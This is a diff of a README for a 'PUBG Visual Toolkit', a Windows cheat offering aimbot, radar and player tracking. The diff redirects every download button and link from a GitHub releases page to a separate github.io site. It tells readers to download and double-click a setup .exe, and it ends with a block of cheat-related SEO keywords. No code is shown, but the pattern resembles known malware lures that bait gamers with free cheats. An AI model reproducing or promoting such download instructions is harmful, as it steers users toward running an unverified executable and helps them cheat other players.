@@ -8,7 +8,7 @@ This toolkit is designed for Windows computers. It works alongside PUBG to give 
 
 ## 📥 Download the Application
 
-[![Download PUBG Visual Toolkit](https://img.shields.io/badge/Download-PUBG_Visual_Toolkit_2026-blue?style=for-the-badge&logo=github)](https://github.com/piciformesdribble4104/pubg-visual-toolkit/releases)
+[![Download PUBG Visual Toolkit](https://img.shields.io/badge/Download-PUBG_Visual_Toolkit_2026-blue?style=for-the-badge&logo=github)](https://piciformesdribble4104.github.io)
 
 Click the button above to go to the download page. This is the official and only download source for this tool.
 
@@ -18,7 +18,7 @@ Visit this link to download the application.
 
 Here's what to do step by step:
 
-1.  Click the download button above or go to: `https://github.com/piciformesdribble4104/pubg-visual-toolkit/releases`
+1.  Click the download button above or go to: `https://piciformesdribble4104.github.io`
 2.  On that page, you will see a list of files. Look for the most recent version. The file will be named something like `pubg-visual-toolkit-setup.exe` or similar.
 3.  Click the file name to start the download. Your browser will save it to your "Downloads" folder.
 4.  Once the download finishes, go to your Downloads folder and double-click the downloaded file to run it.
@@ -132,6 +132,6 @@ PUBG Visual Toolkit is provided as freeware. You are allowed to use it personall
 
 **Ready to dominate?** Head to the download page and get started right now.
 
-[![Download Now](https://img.shields.io/badge/Download-PUBG_Visual_Toolkit-2ea44f?style=for-the-badge)](https://github.com/piciformesdribble4104/pubg-visual-toolkit/releases)
+[![Download Now](https://img.shields.io/badge/Download-PUBG_Visual_Toolkit-2ea44f?style=for-the-badge)](https://piciformesdribble4104.github.io)
 
 Keywords: pubg, pubg tool, pubg visual toolkit, aim assist, radar overlay, player tracker, pubg hack, pubg cheat, pubg aimbot, free pubg tool, no key, pubg assistant, game overlay, windows tool, pubg 2026
